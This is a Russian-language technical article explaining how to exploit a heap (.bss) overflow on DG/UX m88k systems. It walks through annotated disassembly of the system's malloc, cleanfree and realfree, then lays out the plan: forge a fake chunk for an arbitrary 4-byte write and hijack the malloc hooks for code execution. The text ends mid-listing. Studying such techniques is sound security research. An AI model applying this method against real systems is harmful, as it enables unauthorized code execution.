                                                          _   _:.
                                                           :$$$$$
         _   .     - +.                                   :l$││$$
   s┐┐,,_  +:@QSSS$$$$$                                    ``
   $$$$$$$$bs┐.`"┘?$$$l       [ DGUX Heap Overflow ]
   '└└?$$│$$$$b┐_  .        [ hirezia ] 
            `"└$│$b.   .    
                  `└?b.  `.  
                     `┘.   +
                      `$   _.
                        `


 В данной статье описывается практическая реализация использования переполнения 
 heapa на системе DGUX.


 Начнем с общего экскурса по необходимым нам инструкциям m88k.

 Все инструкции 4 байта.
 Все константы big-endian

 Регистры
	
	r0	- 0
	r1	- адрес возврата из функции
	r2-r5	- входные параметры функции
	r6-r7	- just for fun
	r9	- номер сискала
	r10-r24	- just for fun
	r25	- в shared libraries .got таблица
	r26-r29	- just for fun
	r30	- base pointer
	r31	- stack pointer
	 

 Инструкции
 
 ld       r2,0x001038cc  <- загрузить в регистр r2 ,данные по адресу 0x001038cc
 st       r2,0x001038cc  <- сохранить регистр r2 по адресу 0x001038cc
 bsr.n    <strcpy>       <- вызов функции с выполнением следующей за этой
                            инструкцией. в r1 - адрес адрес инструкции + 0x08
 bsr      <strcpy>       <- вызов без выполнения следещей за этой инструкцией в
                            r1 - адрес инcтрукции + 0x04
 br       <strcpy>       <- безусловный переход
 br.n     <strcpy>	 <- безусловный переход с выполнением следующей за этой 
                            инструкцией
 subu     r30,r31,0x50	 <- r30=r31 - 0x50
 addu     r30,r31,0x50	 <- r30=r31 + 0x50
 bcnd.n   eq0,r13, <malloc+68>  <- условный переход с выполнением  следующей за 
                                   этой  инструкцией. eq0 - равенство  нулю. за 
                                   другими префиксами этой функции обратитесь к 
                                   исходникам gas.
 or.u     r24,r0,0xabcd  <- Загрузить 0xabcd в старшее слово в r24 младшее
 or       r24,r0,0xabcd  <- Загрузить 0xabcd в младшее слово 
 ld       r3,r22[r11]    <- r3 = *(r22+r11)
 jmp      r1             <- безусловный переход на r1
	
	
 Рассмотрим кусок кода программы.

                           ld       r2,OUR VICTIM	
  1038cc:   f4 76 16 0b    ld       r3,r22[r11]   <-- Переменная задаваемая как
                                                      часть аргумента к примеру
                                                      ARGV[1]

  1038d0:   cf ff fc 76    bsr.n    <strcpy>      <-- HEAP OVERFLOW
  1038d4:   f4 40 58 19    or       r2,r0,r25

 Состояние регистров

  r2 -> 11EDEC		- принадлежит .bss
  
  r3 ->  0xeffff513 	-> 'AAAAAA...'
  r31 -> 0xeffff360	-> base pointer
  r22 -> 0xeffff4b0	-> argv
  r11 -> 0x00000001	-> номер аргумента.
  
 В  нашем случае мы переполняем не сам heap а именно .bss - но огромной разницы 
 для нас в этом нет так как:

 1)  Другие  переменные  в  .bss счастливым образом не используются ( или может
     используются но не слишком сильно :) до момента вызова malloc.

 2)  Память  которая  нам нужна для организации фейкового чанка уже замаплена и
     нам ее хватит с головой.

 Теперь переходим к самому интересному - алгоритму распределения и очистки heap

 Начнем  с  malloc  -  самое  главное  достоинство  этой  функции  это  наличие
 возможности дебага маллоков при помощи хуков, что будет потом использовано для
 выполнения кода.

 Для начала хотел бы обратить ваше внимание на кусок кода 0x8005f930-0x8005f938
 В  регистр  $r25  записывается  адрес  таблицы глобальных переменных следующим
 образом:

    bsr.n             - вызов  функции, а в нашем случае просто прыжок на след. 
                        команду в $r1  записывается текущее  eip. Постфикс .n - 
                        означает,  что cлед. Команда  за  прыжком  также  будет 
                        выполнятся.

    or r25,r25,0xbd40 - запись в регистр $r25 значения 0xbd40

    addu r25,r25,r1   - фактически  прибавляем к  значению  eip  нашу константу 
                        0xbd40 - и таким образом при  правильном  выборе данной
                        константы (выбором естественно  занимается компилятор),
                        в $r25 мы получаем значение .got таблицы, что позволяет
                        в  дальнейшем   всей  нашей   shared  library   успешно 
                        оперировать своими внутренними данными.Такой трюк очень
                        хорош  для  написания длинных  шеллкодов. В  дальнейшем 
                        не было замечено,чтобы $r25 вообще изменялся в функциях
                        библиотек, поэтому почти со 100% уверенностью можно при
                        дальнейшем анализе функций считать $r25 равным .got.


---------------------------------------------------------- begin of malloc.S

$r25 = 0x800ab678
$r25,0x24 = ADRESS FLAGA PRE HUKA
$r25,0x28 + 0x20 - входящая переменная в huk
($r25,0x24)+0x08 = ADRESS FLAGA POST HUKA


0x8005f920 <malloc>:    subu            r31,r31,0x50
0x8005f924 <malloc+4>:  st.d            r24,r31,0x28
0x8005f928 <malloc+8>:  or.u            r25,r0,0x04
0x8005f92c <malloc+12>: st              r1,r31,0x30

0x8005f930 <malloc+16>: bsr.n            <malloc+24>
0x8005f934 <malloc+20>: or              r25,r25,0xbd40
0x8005f938 <malloc+24>: addu            r25,r25,r1

if (hooked) else <malloc+68>

0x8005f93c <malloc+28>: ld              r13,r25,0x24	
0x8005f940 <malloc+32>: ld              r13,r0,r13
0x8005f944 <malloc+36>: bcnd.n          eq0,r13, <malloc+68>
0x8005f948 <malloc+40>: or              r24,r0,r2
0x8005f94c <malloc+44>: ld              r2,r25,0x28

0x8005f950 <malloc+48>: jsr.n           r13			!!!!!!!!!!!!!!

0x8005f954 <malloc+52>: addu            r2,r2,0x20
0x8005f958 <malloc+56>: bcnd            eq0,r2, <malloc+68>
0x8005f95c <malloc+60>: bsr.n            <__sev_sh_lib_err>
0x8005f960 <malloc+64>: ld              r2,r25,0x2c

0x8005f964 <malloc+68>: bsr.n            <__dg_malloc_unlocked>
0x8005f968 <malloc+72>: or              r2,r0,r24

0x8005f96c <malloc+76>: ld              r13,r25,0x24
0x8005f970 <malloc+80>: ld              r13,r13,0x08
0x8005f974 <malloc+84>: bcnd.n          eq0,r13, <malloc+116>
0x8005f978 <malloc+88>: or              r24,r0,r2

0x8005f97c <malloc+92>: ld              r2,r25,0x28

0x8005f980 <malloc+96>: jsr.n           r13			!!!!!!!!!!!!!!!

0x8005f984 <malloc+100>:addu            r2,r2,0x20
0x8005f988 <malloc+104>:bcnd            eq0,r2, <malloc+116>
0x8005f98c <malloc+108>:bsr.n            <__sev_sh_lib_err>
0x8005f990 <malloc+112>:ld              r2,r25,0x30

0x8005f994 <malloc+116>:ld              r1,r31,0x30
0x8005f998 <malloc+120>:or              r2,r0,r24
0x8005f99c <malloc+124>:ld.d            r24,r31,0x28
0x8005f9a0 <malloc+128>:jmp.n           r1
0x8005f9a4 <malloc+132>:addu            r31,r31,0x50
  
---------------------------------------------------------- end of malloc.S

 Вообщем malloc не делает ничего особо интересного  как мы видим - поэтому идем
 дальше в __dg_malloc_unlocked.
 
 Вот  тут  уже  интереснее.  Скажу  сразу  эта функция и есть сердце DGUXOвских
 маллоков.  Она  все и делает (очищает память(то что нам надо) и добавляет ее).
 free  -  только  помечает  чанк  как уже не нужный, а вот именно эта функция и
 работает   со   списком   чанков.  Оставлю  любознательным  анализировать  все
 возможные  и  не  возможные  переходы  в этой функции и скажу сразу, что чтобы
 добиться  цели  всего  переполнения, а именно перезаписи любых 4 байтов любыми
 четырьмя байтами,  нам  надо  начать  очистку старых чанков. А добровольно это
 сделает __dg_malloc_unlocked. Ну или придется ей помочь, уже не важно.

 Вот вольная интерпретация действий данной функции. Следует отметить сразу, что
 алгоритм используемый при распределении памяти очень сильно сходится с 'System
 V  AT&T'  описанным  в http://phrack.org/phrack/57/p57-0x09. Тот ли именно это
 алгоритм  или  его  модификация  история  умалчивает.  Но могу сказать, что Cи
 вставки  в этой  статье  (кусков  функций описанных ниже) очень помогли для их
 анализа.

>  (r25,0x444) если по адресу этой переменной 0 (при первом mallocе 0) идем в 
   самый конец

>  вызываем cleanfree (см ниже)

>  дальше проверяем если размер меньше ( 0x4F (79)) вызываем smalloc, иначе 
   смотрим дальше.

>__dg_malloc_unlocked - dlia bolshih stranic
>	r25,0x450 - 0x800ad4a8 - tam 0 pri pervom prohode
>	r25,0x454 - 0x800ad4ac - tam 0 pri pervom prohode

> вызываем _morecore -> dobrk :) + пометка флагов 

> размер замапленной памяти - *morecore

> вычищаем служебную информацию + начало чанка = размер и по смещению 0x10
  обнуляем второй бит (флаг)

> вычисляем размер оствашейся после нашего чанка в памяти замапленной _morecore
  (она  выделяет по 4k) и сравниваем его с 0x5f (header + 0x4f). Если больше то
  записываем размер нашего чанка в начало
  
> помечаем следущий чанк, что он готов 

> вычисляем  где  будет   заголовок  нашего  (не  путать с чанком ради которого
  вызывался маллок) чанка.

> (nachalo + (4k - нам нужный размер) - 10) - и пишем туда размер

> потом чистим этот чанк

> realfree

----------------------------------------------- begin of __dg_malloc_unlocked.S

 (r25,0x444) если по адресу этой переменной 0 (при первом mallocе 0) идем в 
 самый конец


0x8005faf0 <_func>:      subu            r31,r31,0x50
0x8005faf4 <_func+4>:    st.d            r24,r31,0x38

0x8005faf8 <_func+8>:    or.u            r25,r0,0x04

0x8005fafc <_func+12>:   st.d            r22,r31,0x30
0x8005fb00 <_func+16>:   or              r22,r0,r2
0x8005fb04 <_func+20>:   st              r1,r31,0x40
0x8005fb08 <_func+24>:   bsr.n            <_func+32>

0x8005fb0c <_func+28>:   or              r25,r25,0xbb68   r25 = 0x0004bb68
0x8005fb10 <_func+32>:   st.d            r20,r31,0x28
if (razmer<0) nahuy
0x8005fb14 <_func+36>:   bcnd.n          lt0,r22, <_func+436>
0x8005fb18 <_func+40>:   addu            r25,r25,r1 	<- EBANUTAYA FICHA
if (razmer kraten 16)
0x8005fb1c <_func+44>:   mask            r12,r22,0x0f
0x8005fb20 <_func+48>:   bcnd.n          eq0,r12, <_func+60>
0x8005fb24 <_func+52>:   addu            r13,r22,0x10 	;razmer+0x10

0x8005fb28 <_func+56>:   subu            r22,r13,r12 -> okruglit do 16

0x8005fb2c <_func+60>:   ld              r9,r25,0x444 -> ssilka kakayato 
                                                         r9 0x800ad4b4
							
0x8005fb30 <_func+64>:   ld              r2,r0,r9     -> prochitali to chto tam
                                                         esli eta huynia == 0
                                                         goto hz kuda 

0x8005fb34 <_func+68>:   bcnd.n          eq0,r2, <_func+200>

0x8005fb38 <_func+72>:   subu            r23,r2,0x10

0x8005fb3c <_func+76>:   tb1             0x01,r0,0xff

0x8005fb40 <_func+80>:   ld              r10,r0,r23
0x8005fb44 <_func+84>:   and             r10,r10,0xfffc
0x8005fb48 <_func+88>:   cmp             r12,r10,r22
0x8005fb4c <_func+92>:   bb1.n           0x03,r12, <_func+136>
0x8005fb50 <_func+96>:   cmp             r13,r22,0x4f
0x8005fb54 <_func+100>:  ld              r13,r25,0x448
0x8005fb58 <_func+104>:  ld              r12,r0,r13
0x8005fb5c <_func+108>:  ld              r11,r25,0x44c
0x8005fb60 <_func+112>:  addu            r12,r12,0x1f
0x8005fb64 <_func+116>:  st              r0,r0,r9
0x8005fb68 <_func+120>:  mask            r12,r12,0x1f
0x8005fb6c <_func+124>:  st              r12,r0,r13
0x8005fb70 <_func+128>:  br.n             <_func+592>
0x8005fb74 <_func+132>:  st              r0,r11[r12]

0x8005fb78 <_func+136>:  and             r13,r13,r12
0x8005fb7c <_func+140>:  extu            r13,r13,1<8>
0x8005fb80 <_func+144>:  bcnd            eq0,r13, <_func+200>
0x8005fb84 <_func+148>:  ld              r12,r25,0x448
0x8005fb88 <_func+152>:  ld              r13,r0,r12
0x8005fb8c <_func+156>:  ld              r11,r25,0x44c
0x8005fb90 <_func+160>:  addu            r13,r13,0x1f
0x8005fb94 <_func+164>:  st              r0,r0,r9
0x8005fb98 <_func+168>:  mask            r13,r13,0x1f
0x8005fb9c <_func+172>:  st              r13,r0,r12
0x8005fba0 <_func+176>:  st              r0,r11[r13]
0x8005fba4 <_func+180>:  tb1             0x01,r0,0xff
0x8005fba8 <_func+184>:  ld              r13,r0,r23
0x8005fbac <_func+188>:  st              r10,r0,r23
0x8005fbb0 <_func+192>:  br.n             <_func+468>
0x8005fbb4 <_func+196>:  mask            r20,r13,0x02

0x8005fbb8 <_func+200>:  bsr.n            <cleanfree>
0x8005fbbc <_func+204>:  or              r2,r0,0

0x8005fbc0 <_func+208>:  cmp             r13,r22,0x4f
0x8005fbc4 <_func+212>:  bb0.n           0x09,r13, <_func+232>
0x8005fbc8 <_func+216>:  or              r20,r0,0
0x8005fbcc <_func+220>:  or              r2,r0,r22
0x8005fbd0 <_func+224>:  bsr.n            <_smalloc>
0x8005fbd4 <_func+228>:  addu            r1,r1,0x168

0x8005fbd8 <_func+232>:  ld              r13,r25,0x450
0x8005fbdc <_func+236>:  ld              r2,r0,r13
0x8005fbe0 <_func+240>:  or              r23,r0,0
0x8005fbe4 <_func+244>:  bcnd.n          eq0,r2, <_func+384>
0x8005fbe8 <_func+248>:  or              r10,r0,0

0x8005fbec <_func+252>:  or              r24,r0,r2
0x8005fbf0 <_func+256>:  tb1             0x01,r0,0xff
0x8005fbf4 <_func+260>:  ld              r13,r0,r24
0x8005fbf8 <_func+264>:  cmp             r13,r13,r22
0x8005fbfc <_func+268>:  bb1             0x0a,r13, <_func+320>
0x8005fc00 <_func+272>:  bcnd            eq0,r10, <_func+288>
0x8005fc04 <_func+276>:  ld              r13,r0,r24
0x8005fc08 <_func+280>:  cmp             r13,r10,r13
0x8005fc0c <_func+284>:  bb1             0x0a,r13, <_func+300>
0x8005fc10 <_func+288>:  or              r23,r0,r24
0x8005fc14 <_func+292>:  tb1             0x01,r0,0xff
0x8005fc18 <_func+296>:  ld              r10,r0,r24
0x8005fc1c <_func+300>:  tb1             0x01,r0,0xff
0x8005fc20 <_func+304>:  ld              r13,r24,0x20
0x8005fc24 <_func+308>:  bcnd            eq0,r13, <_func+340>
0x8005fc28 <_func+312>:  ld              r24,r24,0x20
0x8005fc2c <_func+316>:  br               <_func+256>
0x8005fc30 <_func+320>:  tb1             0x01,r0,0xff
0x8005fc34 <_func+324>:  ld              r13,r24,0x30
0x8005fc38 <_func+328>:  bcnd            eq0,r13, <_func+340>
0x8005fc3c <_func+332>:  ld              r24,r24,0x30
0x8005fc40 <_func+336>:  br               <_func+256>
0x8005fc44 <_func+340>:  bcnd.n          eq0,r23, <_func+356>
0x8005fc48 <_func+344>:  or              r2,r0,r23
0x8005fc4c <_func+348>:  bsr.n            <t_delete>
0x8005fc50 <_func+352>:  addu            r1,r1,0x1c
0x8005fc54 <_func+356>:  ld              r21,r25,0x450
0x8005fc58 <_func+360>:  ld              r13,r0,r21
0x8005fc5c <_func+364>:  cmp             r13,r24,r13
0x8005fc60 <_func+368>:  bb0             0x03,r13, <_func+384>
0x8005fc64 <_func+372>:  bsr.n            <t_splay>
0x8005fc68 <_func+376>:  or              r2,r0,r24
0x8005fc6c <_func+380>:  st              r24,r0,r21

0x8005fc70 <_func+384>:  bcnd            ne0,r23, <_func+444>
0x8005fc74 <_func+388>:  ld              r13,r25,0x454
0x8005fc78 <_func+392>:  ld              r2,r0,r13
0x8005fc7c <_func+396>:  bcnd            eq0,r2, <_func+420>

0x8005fc80 <_func+400>:  tb1             0x01,r0,0xff
0x8005fc84 <_func+404>:  ld              r13,r0,r2
0x8005fc88 <_func+408>:  cmp             r13,r22,r13
0x8005fc8c <_func+412>:  bb1.n           0x09,r13, <_func+444>
0x8005fc90 <_func+416>:  or              r23,r0,r2

0x8005fc94 <_func+420>:  bsr.n            <_morecore>
0x8005fc98 <_func+424>:  or              r2,r0,r22

0x8005fc9c <_func+428>:  or              r23,r0,r2
0x8005fca0 <_func+432>:  bcnd            ne0,r23, <_func+444>
0x8005fca4 <_func+436>:  br.n             <_func+592>
0x8005fca8 <_func+440>:  or              r2,r0,0

0x8005fcac <_func+444>:  tb1             0x01,r0,0xff
0x8005fcb0 <_func+448>:  ld              r12,r0,r23
0x8005fcb4 <_func+452>:  addu            r12,r23,r12
0x8005fcb8 <_func+456>:  ld              r13,r12,0x10
0x8005fcbc <_func+460>:  and             r13,r13,0xfffd
0x8005fcc0 <_func+464>:  st              r13,r12,0x10

0x8005fcc4 <_func+468>:  tb1             0x01,r0,0xff
0x8005fcc8 <_func+472>:  ld              r13,r0,r23
0x8005fccc <_func+476>:  subu            r10,r13,r22
0x8005fcd0 <_func+480>:  cmp             r13,r10,0x5f
0x8005fcd4 <_func+484>:  bb1             0x09,r13, <_func+528>
0x8005fcd8 <_func+488>:  st              r22,r0,r23

0x8005fcdc <_func+492>:  tb1             0x01,r0,0xff
0x8005fce0 <_func+496>:  ld              r13,r0,r23
0x8005fce4 <_func+500>:  subu            r10,r10,0x10
0x8005fce8 <_func+504>:  addu            r13,r23,r13

0x8005fcec <_func+508>:  or              r12,r10,0x01
0x8005fcf0 <_func+512>:  addu            r2,r13,0x20
0x8005fcf4 <_func+516>:  st              r12,r13,0x10
0x8005fcf8	 <_func+520>:  bsr.n            <realfree>
0x8005fcfc <_func+524>:  addu            r1,r1,0x28


0x8005fd00 <_func+528>:  tb1             0x01,r0,0xff
0x8005fd04 <_func+532>:  ld              r13,r0,r23
0x8005fd08 <_func+536>:  ld              r12,r25,0x458
0x8005fd0c <_func+540>:  addu            r13,r13,r23
0x8005fd10 <_func+544>:  ld              r12,r0,r12
0x8005fd14 <_func+548>:  addu            r13,r13,0x20
0x8005fd18 <_func+552>:  cmp             r13,r13,r12
0x8005fd1c <_func+556>:  bb1             0x03,r13, <_func+568>
0x8005fd20 <_func+560>:  ld              r13,r25,0x454
0x8005fd24 <_func+564>:  st              r0,r0,r13

0x8005fd28 <_func+568>:  tb1             0x01,r0,0xff
0x8005fd2c <_func+572>:  ld              r13,r0,r23
0x8005fd30 <_func+576>:  or              r13,r13,0x01
0x8005fd34 <_func+580>:  addu            r2,r23,0x10
0x8005fd38 <_func+584>:  or              r13,r13,r20
0x8005fd3c <_func+588>:  st              r13,r0,r23
0x8005fd40 <_func+592>:  ld              r1,r31,0x40
0x8005fd44 <_func+596>:  ld.d            r24,r31,0x38
0x8005fd48 <_func+600>:  ld.d            r22,r31,0x30
0x8005fd4c <_func+604>:  ld.d            r20,r31,0x28
0x8005fd50 <_func+608>:  jmp.n           r1
0x8005fd54 <_func+612>:  addu            r31,r31,0x50

------------------------------------------------- end of __dg_malloc_unlocked.S

 Пришло самое  время  разобраться, как же все-таки в данном алгоритме создаются
 чанки  и  какой  страшный философский смысл таится в этом слове для DGUXOVSKIH
 mallocов.

 Сhank header занимает как минимум 0x10 байт - возможны и другие варианты когда
 чанки вкладываются в друг друга (это выражение достаточно спорно, так как  еще
 в  первом  классе  мы учили, что чанки вкладываться не могут, но это уж другая
 история).

 chunk_header = mem_pointer - 0x10


  ----------------------------------------------------------- средний чанк  
          Длина    |				   |
            | Флаги|				   |
   6 bit    | 2bit | 8 bit     |8 bit     |8 bit   |
     0000000010    0000000000 0000000000 0000000000  <- header 
     AAAAAAAAAA	   AAAAAAAAAA AAAAAAAAAA AAAAAAAAAA  <- data

  -----------------------------------------------------------

 Длинна чанка всегда кратна 4, поэтому 2 бита, длинны, могут использоваться для 
 служебной информации.

 Чанки можно разбить на 3 вида, для которых алгоритмы распределения 
 принципиально различаются.

 1) Маленькие - меньше 0x4F (почему именно _это_ число, видно из описания 
    функции выше)

 2) Средние - больше 0x4F,но меньше 4k- это чанки для которых,в случае нехватки
    места, все равно замапливается 4k, а остальное место отдается под маленькие
    чанки которые тут же кстати и создаются.

 3) Большие - чанки для которых сразу замапливается больше 4k.

 Чудесным  образом в нашей программе первый маллок после переполнения был 0x400
 байт  -  как  видно  это  самый,  что  ни наесть средний чанк, поэтому систему
 организации именно их мы и будем рассматривать. Такие чанки представляют собой
 двухсвязный список.

 Как видно __dg_malloc_unlocked для создания чанка вызывает еще cleanfree - для
 очистки всех неиспользуемых чанков. Это wraper для realfree.

---------------------------------------------------------- begin of cleanfree.S

x80060928 <cleanfree>: 	subu            r31,r31,0x40
0x8006092c <cleanfree+4>:       st.d            r24,r31,0x28
0x80060930 <cleanfree+8>:       or.u            r25,r0,0x04
0x80060934 <cleanfree+12>:      st              r1,r31,0x30
0x80060938 <cleanfree+16>:      bsr.n            <cleanfree+24>
0x8006093c <cleanfree+20>:      or              r25,r25,0xad38
0x80060940 <cleanfree+24>:      st.d            r22,r31,0x20
0x80060944 <cleanfree+28>:      addu            r25,r25,r1

0x80060948 <cleanfree+32>:      ld              r13,r25,0x448
0x8006094c <cleanfree+36>:      ld              r12,r25,0x44c	0x800ad4b8
0x80060950 <cleanfree+40>:      ld              r13,r0,r13	0
0x80060954 <cleanfree+44>:      or              r23,r0,r12
0x80060958 <cleanfree+48>:      or              r22,r0,r2
0x8006095c <cleanfree+52>:      lda             r24,r23[r13]  ??????
0x80060960 <cleanfree+56>:      cmp             r13,r24,r23
0x80060964 <cleanfree+60>:      bb1             0x03,r13, <cleanfree+68>

0x80060968 <cleanfree+64>:      addu            r24,r24,0x80
0x8006096c <cleanfree+68>:      subu            r24,r24,0x04

0x80060970 <cleanfree+72>:      ld              r2,r0,r24
0x80060974 <cleanfree+76>:      bcnd.n          eq0,r2, <cleanfree+100>
0x80060978 <cleanfree+80>:      cmp             r13,r2,r22
0x8006097c <cleanfree+84>:      bb0             0x03,r13, <cleanfree+92>
0x80060980 <cleanfree+88>:      bsr              <realfree>
0x80060984 <cleanfree+92>:      br.n             <cleanfree+56>
0x80060988 <cleanfree+96>:      st              r0,r0,r24

0x8006098c <cleanfree+100>:     ld              r13,r25,0x448
0x80060990 <cleanfree+104>:     ld              r12,r25,0x444
0x80060994 <cleanfree+108>:     st              r0,r0,r13
0x80060998 <cleanfree+112>:     st              r0,r0,r12
0x8006099c <cleanfree+116>:     ld              r1,r31,0x30
0x800609a0 <cleanfree+120>:     ld.d            r24,r31,0x28
0x800609a4 <cleanfree+124>:     ld.d            r22,r31,0x20
0x800609a8 <cleanfree+128>:     jmp.n           r1
0x800609ac <cleanfree+132>:     addu            r31,r31,0x40

----------------------------------------------------------- end of cleanfree.S

 Задача realfree пройтись по этому двухсвязному списку и выкинуть из него 
 (t_delete) уже удаленные чанки.

realfree
>	берем размер чанка - r2-0x10
>	выравниваем его do %4
>	проверяем его на 0x4f
>	смотрим что там со след чанком
>	если чанк на данный момент последний в нашей схеме, то делаем след. 
        действия иначе t_delete
>	чанка i zapisana edenichka
>	помечаем *(chank_head+0x40) = 0
>	помечаем *(chank_head+0x30) = 0
>	помечаем *(chank_head+0x20) = 0
>	помечаем *(chank_head+0x10) = 0
>	загружаем по адресу следующего чанка его значение
>	далее
>	r25,0x458 - 0x800ad4b0 - 0
>	r25,0x454 - по этому адресу записываем конец очищаемого чанка
>	ставим на чанк 10


----------------------------------------------------------- begin of realfree.S

0x800600f0 <realfree>:  subu            r31,r31,0x50
0x800600f4 <realfree+4>:        st              r1,r31,0x40
0x800600f8 <realfree+8>:        st.d            r24,r31,0x38
0x800600fc <realfree+12>:       or.u            r25,r0,0x04
0x80060100 <realfree+16>:       st.d            r22,r31,0x30
0x80060104 <realfree+20>:       subu            r23,r2,0x10
0x80060108 <realfree+24>:       st              r21,r31,0x2c
0x8006010c <realfree+28>:       bsr.n            <realfree+36>
0x80060110 <realfree+32>:       or              r25,r25,0xb564
0x80060114 <realfree+36>:       tb1             0x01,r0,0xff
0x80060118 <realfree+40>:       ld              r21,r0,r23

0x8006011c <realfree+44>:       bb0.n           0,r21, <realfree+576>
0x80060120 <realfree+48>:       addu            r25,r25,r1

0x80060124 <realfree+52>:       ld              r13,r0,r23
0x80060128 <realfree+56>:       and             r13,r13,0xfffc
0x8006012c <realfree+60>:       st              r13,r0,r23

0x80060130 <realfree+64>:       tb1             0x01,r0,0xff
0x80060134 <realfree+68>:       ld              r13,r0,r23
0x80060138 <realfree+72>:       cmp             r13,r13,0x4f

0x8006013c <realfree+76>:       bb0             0x09,r13, <realfree+112>

0x80060140 <realfree+80>:       ld              r13,r0,r23
0x80060144 <realfree+84>:       extu            r13,r13,0<4>
0x80060148 <realfree+88>:       ld              r12,r25,0x440
0x8006014c <realfree+92>:       subu            r21,r13,0x01
0x80060150 <realfree+96>:       ld              r13,r12[r21]
0x80060154 <realfree+100>:      st              r13,r0,r2
0x80060158 <realfree+104>:      br.n             <realfree+576>
0x8006015c <realfree+108>:      st              r23,r12[r21]

0x80060160 <realfree+112>:      tb1             0x01,r0,0xff

0x80060164 <realfree+116>:      ld              r13,r0,r23
0x80060168 <realfree+120>:      addu            r22,r23,r13
0x8006016c <realfree+124>:      ld              r13,r22,0x10

0x80060170 <realfree+128>:      bb1.n           0,r13, <realfree+184>
0x80060174 <realfree+132>:      addu            r24,r22,0x10

0x80060178 <realfree+136>:      ld              r13,r25,0x454
0x8006017c <realfree+140>:      ld              r13,r0,r13
0x80060180 <realfree+144>:      cmp             r13,r24,r13
0x80060184 <realfree+148>:      bb0             0x03,r13, <realfree+160>
0x80060188 <realfree+152>:      bsr.n            <t_delete>
0x8006018c <realfree+156>:      or              r2,r0,r24
0x80060190 <realfree+160>:      tb1             0x01,r0,0xff
0x80060194 <realfree+164>:      ld              r13,r0,r23
0x80060198 <realfree+168>:      ld              r12,r22,0x10
0x8006019c <realfree+172>:      addu            r13,r13,0x10
0x800601a0 <realfree+176>:      addu            r13,r13,r12
0x800601a4 <realfree+180>:      st              r13,r0,r23

0x800601a8 <realfree+184>:      bb0.n           0x01,r21, <realfree+232>
0x800601ac <realfree+188>:      subu            r13,r0,0x10
0x800601b0 <realfree+192>:      ld              r24,r23,r13
0x800601b4 <realfree+196>:      bsr.n            <t_delete>
0x800601b8 <realfree+200>:      or              r2,r0,r24
0x800601bc <realfree+204>:      tb1             0x01,r0,0xff
0x800601c0 <realfree+208>:      ld              r13,r0,r24
0x800601c4 <realfree+212>:      ld              r12,r0,r23
0x800601c8 <realfree+216>:      addu            r13,r13,0x10
0x800601cc <realfree+220>:      or              r23,r0,r24
0x800601d0 <realfree+224>:      addu            r13,r13,r12
0x800601d4 <realfree+228>:      st              r13,r0,r23

0x800601d8 <realfree+232>:      st              r0,r23,0x40
0x800601dc <realfree+236>:      tb1             0x01,r0,0xff
0x800601e0 <realfree+240>:      ld              r13,r23,0x40
0x800601e4 <realfree+244>:      st              r13,r23,0x30
0x800601e8 <realfree+248>:      tb1             0x01,r0,0xff
0x800601ec <realfree+252>:      ld              r13,r23,0x30
0x800601f0 <realfree+256>:      st              r13,r23,0x20
0x800601f4 <realfree+260>:      tb1             0x01,r0,0xff
0x800601f8 <realfree+264>:      ld              r13,r23,0x20
0x800601fc <realfree+268>:      st              r13,r23,0x10
0x80060200 <realfree+272>:      tb1             0x01,r0,0xff

0x80060204 <realfree+276>:      ld              r13,r0,r23
0x80060208 <realfree+280>:      st              r23,r23,r13

0x8006020c <realfree+284>:      ld              r13,r0,r23
0x80060210 <realfree+288>:      ld              r12,r25,0x458
0x80060214 <realfree+292>:      addu            r13,r13,r23
0x80060218 <realfree+296>:      ld              r12,r0,r12
0x8006021c <realfree+300>:      addu            r13,r13,0x20
0x80060220 <realfree+304>:      cmp             r13,r13,r12
0x80060224 <realfree+308>:      bb1             0x03,r13, <realfree+324>
0x80060228 <realfree+312>:      ld              r13,r25,0x454

0x8006022c <realfree+316>:      br.n             <realfree+552>
0x80060230 <realfree+320>:      st              r23,r0,r13

0x80060234 <realfree+324>:      ld              r13,r25,0x450
0x80060238 <realfree+328>:      ld              r2,r0,r13
0x8006023c <realfree+332>:      bcnd            eq0,r2, <realfree+548>
0x80060240 <realfree+336>:      tb1             0x01,r0,0xff
0x80060244 <realfree+340>:      ld              r12,r0,r23
0x80060248 <realfree+344>:      or              r24,r0,r2
0x8006024c <realfree+348>:      or              r11,r0,r13
0x80060250 <realfree+352>:      subu            r10,r0,0x01
0x80060254 <realfree+356>:      tb1             0x01,r0,0xff
0x80060258 <realfree+360>:      ld              r13,r0,r24
0x8006025c <realfree+364>:      cmp             r13,r13,r12
0x80060260 <realfree+368>:      bb1             0x09,r13, <realfree+400>
0x80060264 <realfree+372>:      ld              r13,r24,0x20
0x80060268 <realfree+376>:      bcnd            eq0,r13, <realfree+388>
0x8006026c <realfree+380>:      ld              r24,r24,0x20
0x80060270 <realfree+384>:      br               <realfree+356>
0x80060274 <realfree+388>:      st              r23,r24,0x20
0x80060278 <realfree+392>:      st              r24,r23,0x10
0x8006027c <realfree+396>:      br               <realfree+552>
0x80060280 <realfree+400>:      tb1             0x01,r0,0xff
0x80060284 <realfree+404>:      ld              r13,r0,r24
0x80060288 <realfree+408>:      cmp             r13,r13,r12
0x8006028c <realfree+412>:      bb0             0x0a,r13, <realfree+444>
0x80060290 <realfree+416>:      ld              r13,r24,0x30
0x80060294 <realfree+420>:      bcnd            eq0,r13, <realfree+432>
0x80060298 <realfree+424>:      ld              r24,r24,0x30
0x8006029c <realfree+428>:      br               <realfree+356>
0x800602a0 <realfree+432>:      st              r23,r24,0x30
0x800602a4 <realfree+436>:      st              r24,r23,0x10
0x800602a8 <realfree+440>:      br               <realfree+552>
0x800602ac <realfree+444>:      tb1             0x01,r0,0xff
0x800602b0 <realfree+448>:      ld              r12,r24,0x10
0x800602b4 <realfree+452>:      bcnd            eq0,r12, <realfree+488>
0x800602b8 <realfree+456>:      ld              r13,r12,0x20
0x800602bc <realfree+460>:      cmp             r13,r24,r13
0x800602c0 <realfree+464>:      bb1             0x03,r13, <realfree+476>
0x800602c4 <realfree+468>:      st              r23,r12,0x20
0x800602c8 <realfree+472>:      br               <realfree+480>
0x800602cc <realfree+476>:      st              r23,r12,0x30
0x800602d0 <realfree+480>:      st              r12,r23,0x10
0x800602d4 <realfree+484>:      br               <realfree+492>
0x800602d8 <realfree+488>:      st              r23,r0,r11
0x800602dc <realfree+492>:      tb1             0x01,r0,0xff
0x800602e0 <realfree+496>:      ld              r12,r24,0x20
0x800602e4 <realfree+500>:      bcnd            eq0,r12, <realfree+508>
0x800602e8 <realfree+504>:      st              r23,r12,0x10
0x800602ec <realfree+508>:      st              r12,r23,0x20
0x800602f0 <realfree+512>:      tb1             0x01,r0,0xff
0x800602f4 <realfree+516>:      ld              r12,r24,0x30
